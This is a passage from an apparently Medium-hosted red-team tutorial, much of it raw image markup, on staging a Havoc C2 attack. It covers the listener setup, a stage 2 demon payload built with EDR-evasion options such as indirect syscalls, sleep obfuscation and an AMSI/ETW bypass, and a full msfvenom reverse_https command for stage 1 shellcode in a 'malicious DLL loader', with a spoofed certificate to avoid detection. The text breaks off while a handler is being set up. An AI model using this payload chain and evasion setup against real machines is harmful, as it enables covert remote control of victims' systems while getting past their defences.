https://miro.medium.com/v2/resize:fit:828/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ROeGEesh5jf8W0Ho_QTVcg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ROeGEesh5jf8W0Ho_QTVcg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ROeGEesh5jf8W0Ho_QTVcg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ROeGEesh5jf8W0Ho_QTVcg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ROeGEesh5jf8W0Ho_QTVcg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ROeGEesh5jf8W0Ho_QTVcg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ROeGEesh5jf8W0Ho_QTVcg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="262" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ROeGEesh5jf8W0Ho_QTVcg.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Set up the client which connects to the Team Server</figcaption></figure><p id="67cb" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Finally, the user interface GUI appears which allows us to create listeners and payloads for those listeners.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm qe"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Y8D9_X6qcz0PsQ5Z1In_ag.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="357" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*Y8D9_X6qcz0PsQ5Z1In_ag.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Havoc C2 User Interface</figcaption></figure><h2 id="ee66" class="ok ol hl bg om on oo il op oq or io os ot ou ov ow ox oy oz pa pb pc pd pe pf bl" data-selectable-paragraph="">Setting Up a Havoc C2 Listener</h2><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm qf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i1g3aBFt3Y1i2w7ljrFPew.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*i1g3aBFt3Y1i2w7ljrFPew.png 640w, https://miro.medium.com/v2/resize:fit:720/1*i1g3aBFt3Y1i2w7ljrFPew.png 720w, https://miro.medium.com/v2/resize:fit:750/1*i1g3aBFt3Y1i2w7ljrFPew.png 750w, https://miro.medium.com/v2/resize:fit:786/1*i1g3aBFt3Y1i2w7ljrFPew.png 786w, https://miro.medium.com/v2/resize:fit:828/1*i1g3aBFt3Y1i2w7ljrFPew.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*i1g3aBFt3Y1i2w7ljrFPew.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*i1g3aBFt3Y1i2w7ljrFPew.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="352" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*i1g3aBFt3Y1i2w7ljrFPew.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">User Agent Generator for Havoc C2 Listener</figcaption></figure><p id="4eeb" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Go to ‘View &gt; Listeners’ to set up the listener which the victim will connect to when it executes the stage 2 payload. Use the user agent generator above to create a random user agent.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div class="pl pm qg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 1100w, https://miro.medium.com/v2/resize:fit:1104/format:webp/1*36dvULOxixFZBkFJ3uFTRg.png 1104w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 552px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*36dvULOxixFZBkFJ3uFTRg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*36dvULOxixFZBkFJ3uFTRg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*36dvULOxixFZBkFJ3uFTRg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*36dvULOxixFZBkFJ3uFTRg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*36dvULOxixFZBkFJ3uFTRg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*36dvULOxixFZBkFJ3uFTRg.png 1100w, https://miro.medium.com/v2/resize:fit:1104/1*36dvULOxixFZBkFJ3uFTRg.png 1104w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 552px"><img alt="" class="bi mn py c" width="552" height="844" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:552/1*36dvULOxixFZBkFJ3uFTRg.png"></picture></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Havoc C2 HTTPS Listener</figcaption></figure><h2 id="0817" class="ok ol hl bg om on oo il op oq or io os ot ou ov ow ox oy oz pa pb pc pd pe pf bl" data-selectable-paragraph="">Creating the Stage 2 Shellcode</h2><p id="47ee" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">We create the second stage shellcode that will be transferred to the victim from the attacker after the initial stage 1 connection. The intent is that this shellcode is much larger than the Stage 1 shellcode so we reduce the size of the shellcode we put on disk. Click ‘Attack &gt; Payload’.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div class="pl pm qh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 1100w, https://miro.medium.com/v2/resize:fit:1106/format:webp/1*65pviat2yIw5UKgfqC_-DA.png 1106w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 553px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*65pviat2yIw5UKgfqC_-DA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*65pviat2yIw5UKgfqC_-DA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*65pviat2yIw5UKgfqC_-DA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*65pviat2yIw5UKgfqC_-DA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*65pviat2yIw5UKgfqC_-DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*65pviat2yIw5UKgfqC_-DA.png 1100w, https://miro.medium.com/v2/resize:fit:1106/1*65pviat2yIw5UKgfqC_-DA.png 1106w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 553px"><img alt="" class="bi mn py c" width="553" height="727" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:553/1*65pviat2yIw5UKgfqC_-DA.png"></picture></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Havoc C2 HTTPS Payload (demon.x64.bin)</figcaption></figure><p id="6df2" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Some information about the options we used to make our stage 2 payload more stealthy:</p><ul class=""><li id="b5e7" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe bl" data-selectable-paragraph="">Indirect Syscalls make the execution of the syscall command takes place within the memory of the ntdll.dll and is therefore legitimate for the EDR. By replacing direct syscalls with indirect ones, the resulting call stack mimics a more conventional execution pattern. This can be useful in bypassing EDR systems that examine the memory area where syscalls and their returns are executed. The weakness of this is ETW which may be compensated by Hardware Breakpoints described below.</li><li id="ecdc" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Stack duplication is used during sleep phases to evade detection during C2 operations.</li><li id="081b" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Foliage is a sleep obfuscation technique that creates a new thread and uses NtApcQueueThread to queue a ROP chain. Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things. In this case, Foliage encrypts our agent memory and delays execution.</li><li id="04cb" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">RtlCreateTimer is used to queue the ROP chain itself during between sleep cycles.</li><li id="ea68" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">The combination of AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows) makes it challenging for red teams to simulate attacks, such as domain enumeration and privilege escalation, because AMSI scans code and ETW provides reports about classes and methods used by PEs. So we want to bypass this with hardware breakpoints which basically loads a new process in debug mode without the hooked EDR or amsi.dll. Read about the technique here:</li></ul><div class="qi qj qk ql qm qn"><a href="https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints?source=post_page-----733d423fc67b---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qo ac cb"><div class="qp ac cv ci cd qq"><h2 class="bg hm qr ab ga qs qt qu qv qw qx hk bl">Blindside: A New Technique for EDR Evasion with Hardware Breakpoints</h2><div class="qy m"><h3 class="bg b qr ab ga qs qt qu qv qw qx eb">Utilizing hardware breakpoints to evade monitoring by endpoint detection and response platforms and other…</h3></div><div class="qz m"><p class="bg b ec ab ga qs qt qu qv qw qx eb">cymulate.com</p></div></div><div class="ra m"><div class="xb m rc rd re ra rf mn qn"></div></div></div></a></div><p id="8d55" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Click generate and we see the payload saved as demon.x64.bin.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div class="pl pm rg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 1100w, https://miro.medium.com/v2/resize:fit:1032/format:webp/1*uBdGlfcE5qirpp-F0fdyaQ.png 1032w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 516px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*uBdGlfcE5qirpp-F0fdyaQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*uBdGlfcE5qirpp-F0fdyaQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*uBdGlfcE5qirpp-F0fdyaQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*uBdGlfcE5qirpp-F0fdyaQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*uBdGlfcE5qirpp-F0fdyaQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*uBdGlfcE5qirpp-F0fdyaQ.png 1100w, https://miro.medium.com/v2/resize:fit:1032/1*uBdGlfcE5qirpp-F0fdyaQ.png 1032w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 516px"><img alt="" class="bi mn py c" width="516" height="168" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:516/1*uBdGlfcE5qirpp-F0fdyaQ.png"></picture></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Stage 2 Shellcode Saved Location</figcaption></figure><h2 id="508c" class="ok ol hl bg om on oo il op oq or io os ot ou ov ow ox oy oz pa pb pc pd pe pf bl" data-selectable-paragraph="">Creating the Stage 1 Shellcode</h2><p id="28d5" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">We need to create our first stage payload which is the only shellcode that will be inside of our malicious DLL loader (on disk) on the victim. We first want to generate a SSL certificate that will not be fingerprinted as being from msfvenom. This is extremely important or your meterpreter connection will be detected.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm rh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lxPR4yjg4XrEOWsMMMgt1g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*lxPR4yjg4XrEOWsMMMgt1g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*lxPR4yjg4XrEOWsMMMgt1g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*lxPR4yjg4XrEOWsMMMgt1g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*lxPR4yjg4XrEOWsMMMgt1g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*lxPR4yjg4XrEOWsMMMgt1g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*lxPR4yjg4XrEOWsMMMgt1g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*lxPR4yjg4XrEOWsMMMgt1g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="141" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*lxPR4yjg4XrEOWsMMMgt1g.png"></picture></div></div></figure><p id="e83c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Then we compile the shellcode with the following options to help us remain undetected by AV/EDR:</p><blockquote class="ri rj rk"><p id="dcf0" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">msfvenom -p windows/x64/custom/reverse_https LHOST=10.0.2.9 LPORT=8443 EXITFUNC=thread -f raw HttpUserAgent=’Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' LURI=blog.html HandlerSSLCert=/home/atler/Downloads/www.google.com.pem</p></blockquote><p id="6d7e" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">This shellcode creates a reverse shell connection to our attacker machine to transfer the Stage 2 payload (demon.x64.bin) we just generated. Only about 2500 bytes is pretty good!</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm rm"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iwpNqY3OspPtaLQ76wti4A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*iwpNqY3OspPtaLQ76wti4A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*iwpNqY3OspPtaLQ76wti4A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*iwpNqY3OspPtaLQ76wti4A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*iwpNqY3OspPtaLQ76wti4A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*iwpNqY3OspPtaLQ76wti4A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*iwpNqY3OspPtaLQ76wti4A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*iwpNqY3OspPtaLQ76wti4A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="158" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*iwpNqY3OspPtaLQ76wti4A.png"></picture></div></div></figure><p id="fd68" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Now we need to create a listener using msfconsole to handle the reverse shell code we just created. We make sure 